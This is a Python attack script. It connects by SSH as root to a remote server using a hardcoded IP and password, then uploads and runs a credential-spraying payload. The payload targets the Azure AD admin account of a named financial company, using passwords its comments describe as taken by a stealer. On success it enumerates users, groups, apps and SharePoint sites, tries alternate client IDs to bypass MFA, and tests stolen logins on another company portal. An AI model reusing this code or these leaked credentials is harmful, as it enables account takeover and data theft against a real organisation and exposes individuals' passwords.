import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, re, time
urllib3.disable_warnings()

TENANT = "30fcec21-d05d-4ca6-8233-a90183fc7dbd"
TOKEN_URL = f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token"

# Azure PowerShell client (no MFA requirement for non-interactive)
CLIENT_IDS = [
    ("1b730954-1685-4b74-9bfd-dac224a7b894", "Azure PowerShell"),
    ("04b07795-8ddb-461a-bbee-02f9e1bf7b46", "Azure CLI"),
    ("d3590ed6-52b3-4102-aeff-aad2292ab01c", "Microsoft Office"),
    ("1fec8e78-bce4-4aaf-ab1b-5451cc387264", "Microsoft Teams"),
    ("00000002-0000-0ff1-ce00-000000000000", "Office 365 Exchange"),
    ("66a88757-258c-4c72-893c-3e8bed4d6899", "OneDrive"),
]

# Passwords to try for admin@findep.global (UNLOCKED — AADSTS50126)
PASSWORDS = [
    "BcF1s42o2d*",         # Second stealer password
    "4dm1n##*2411",        # First stealer password (confirmed wrong but retry diff client)
    "4dm1n##*2412",        # Year increment
    "4dm1n##*2511",        # Year+month increment
    "4dm1n##*2611",        # 2026
    "Adm1n##*2411",        # Capital A
    "4dm1n##*2024",        # Year variant
    "4dm1n##*2025",        # Year variant
    "4dm1n##*2026",        # Year variant
    "Admin2024!",          # Common pattern
    "Admin2025!",          # Common pattern
    "Admin2026!",          # Common pattern
    "Findep2024!",         # Corporate pattern
    "Findep2025!",         # Corporate pattern
    "Findep2026!",         # Corporate pattern
    "AFI2022*",            # Shared within org
    "AFI2023*",            # Incremented
    "AFI2024*",            # Incremented
    "AFI2025*",            # Incremented
    "AFI2026*",            # Incremented
    "Rul76846",            # mmartinez pwd
]

sys.stdout.write("=" * 60 + "\n=== AZURE AD ADMIN SPRAY (CAREFUL) ===\n" + "=" * 60 + "\n\n")

# Only try with the first client_id to avoid lockout
client_id, client_name = CLIENT_IDS[0]

for pwd in PASSWORDS:
    try:
        r = requests.post(TOKEN_URL,
            data={
                "grant_type": "password",
                "client_id": client_id,
                "scope": "https://graph.microsoft.com/.default",
                "username": "admin@findep.global",
                "password": pwd,
            },
            timeout=10)
        
        data = r.json()
        
        if "access_token" in data:
            sys.stdout.write(f"\n\n*** AZURE AD LOGIN SUCCESS ***\n")
            sys.stdout.write(f"  admin@findep.global : {pwd}\n")
            sys.stdout.write(f"  Token: {data['access_token'][:100]}...\n")
            sys.stdout.write(f"  Scope: {data.get('scope', 'N/A')}\n")
            sys.stdout.write(f"  Refresh: {data.get('refresh_token', 'N/A')[:50]}...\n\n")
            
            token = data["access_token"]
            
            # Get user info
            r_me = requests.get("https://graph.microsoft.com/v1.0/me",
                headers={"Authorization": f"Bearer {token}"}, timeout=10)
            if r_me.status_code == 200:
                me = r_me.json()
                sys.stdout.write(f"  Display: {me.get('displayName')}\n")
                sys.stdout.write(f"  Job: {me.get('jobTitle')}\n")
                sys.stdout.write(f"  Mail: {me.get('mail')}\n")
                sys.stdout.write(f"  UPN: {me.get('userPrincipalName')}\n")
                sys.stdout.write(f"  ID: {me.get('id')}\n\n")
            
            # List all users
            r_users = requests.get("https://graph.microsoft.com/v1.0/users?$top=100",
                headers={"Authorization": f"Bearer {token}"}, timeout=10)
            if r_users.status_code == 200:
                users = r_users.json().get("value", [])
                sys.stdout.write(f"  === USERS ({len(users)}) ===\n")
                for u in users:
                    sys.stdout.write(f"    {u.get('userPrincipalName')} | {u.get('displayName')} | {u.get('jobTitle', 'N/A')}\n")
            
            # List groups
            r_groups = requests.get("https://graph.microsoft.com/v1.0/groups?$top=100",
                headers={"Authorization": f"Bearer {token}"}, timeout=10)
            if r_groups.status_code == 200:
                groups = r_groups.json().get("value", [])
                sys.stdout.write(f"\n  === GROUPS ({len(groups)}) ===\n")
                for g in groups:
                    sys.stdout.write(f"    {g.get('displayName')} | {g.get('description', 'N/A')[:50]}\n")
            
            # List applications
            r_apps = requests.get("https://graph.microsoft.com/v1.0/applications?$top=50",
                headers={"Authorization": f"Bearer {token}"}, timeout=10)
            if r_apps.status_code == 200:
                apps = r_apps.json().get("value", [])
                sys.stdout.write(f"\n  === APPS ({len(apps)}) ===\n")
                for a in apps:
                    sys.stdout.write(f"    {a.get('displayName')} | {a.get('appId')}\n")
            
            # Check for SharePoint sites
            r_sites = requests.get("https://graph.microsoft.com/v1.0/sites?search=*",
                headers={"Authorization": f"Bearer {token}"}, timeout=10)
            if r_sites.status_code == 200:
                sites = r_sites.json().get("value", [])
                sys.stdout.write(f"\n  === SHAREPOINT SITES ({len(sites)}) ===\n")
                for s in sites:
                    sys.stdout.write(f"    {s.get('name')} | {s.get('webUrl')}\n")
            
            sys.stdout.flush()
            break  # Stop after success
        else:
            error = data.get("error_description", "")[:120]
            aadsts = re.search(r'AADSTS(\d+)', error)
            code = aadsts.group(0) if aadsts else data.get("error", "?")
            
            tag = ""
            if "50053" in str(code):
                tag = " *** LOCKED! STOP ***"
                sys.stdout.write(f"  [{code}] admin:{pwd[:15]}... {tag}\n")
                sys.stdout.flush()
                break  # STOP if locked
            elif "50076" in str(code) or "50079" in str(code):
                tag = " *** MFA REQUIRED = CREDS VALID ***"
            elif "53003" in str(code):
                tag = " *** CONDITIONAL ACCESS BLOCK = CREDS MAY BE VALID ***"
            elif "50055" in str(code):
                tag = " *** PASSWORD EXPIRED = CREDS VALID ***"
            elif "50057" in str(code):
                tag = " *** ACCOUNT DISABLED ***"
            
            sys.stdout.write(f"  [{code}] admin:{pwd[:15]}...{tag}\n")
            
            if "VALID" in tag:
                sys.stdout.write(f"\n  VALID CREDS FOUND: admin@findep.global : {pwd}\n")
                sys.stdout.write(f"  Full error: {error}\n")
                
                # Try other client IDs to bypass MFA/CA
                for alt_cid, alt_name in CLIENT_IDS[1:]:
                    r2 = requests.post(TOKEN_URL,
                        data={
                            "grant_type": "password",
                            "client_id": alt_cid,
                            "scope": "https://graph.microsoft.com/.default",
                            "username": "admin@findep.global",
                            "password": pwd,
                        },
                        timeout=10)
                    d2 = r2.json()
                    if "access_token" in d2:
                        sys.stdout.write(f"  *** SUCCESS via {alt_name} ***\n")
                        sys.stdout.write(f"  Token: {d2['access_token'][:80]}...\n")
                        break
                    else:
                        e2 = re.search(r'AADSTS(\d+)', d2.get("error_description", ""))
                        sys.stdout.write(f"  {alt_name}: {e2.group(0) if e2 else '?'}\n")
                    time.sleep(0.5)
                break
    except Exception as e:
        sys.stdout.write(f"  ERR: {str(e)[:80]}\n")
    
    time.sleep(2)  # 2s cooldown to avoid lockout
    sys.stdout.flush()


# ========================================
# ALSO: Try SIF (sif.findep.mx)
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== SIF LOGIN ===\n" + "=" * 60 + "\n\n")

sif_creds = [
    ("admin", "4dm1n##*2411"),
    ("admin", "BcF1s42o2d*"),
    ("mmartinez", "Rul76846"),
    ("bemedezar", "AFI2022*"),
    ("jsanchezfern", "AFI2022*"),
    ("bmendezar", "AFI2022*"),
    ("aguzmango", "Capacita-1"),
]

for user, pwd in sif_creds:
    try:
        r = requests.get("https://sif.findep.mx/", verify=False, timeout=10, 
                         headers={"User-Agent": "Mozilla/5.0"})
        # Check if SIF exists
        sys.stdout.write(f"  SIF status: [{r.status_code}] ({len(r.text)}b)\n")
        
        # Try login
        r2 = requests.post("https://sif.findep.mx/login",
            data={"username": user, "password": pwd},
            verify=False, timeout=10, allow_redirects=False)
        sys.stdout.write(f"  [{r2.status_code}] {user}:{pwd[:10]}... Loc={r2.headers.get('Location','N/A')[:50]}\n")
    except Exception as e:
        sys.stdout.write(f"  SIF ERR: {str(e)[:60]}\n")
        break
    sys.stdout.flush()


sys.stdout.write("\n\n=== ALL DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/fp_azure_admin_final.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/fp_azure_admin_final.py 2>&1', timeout=300)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
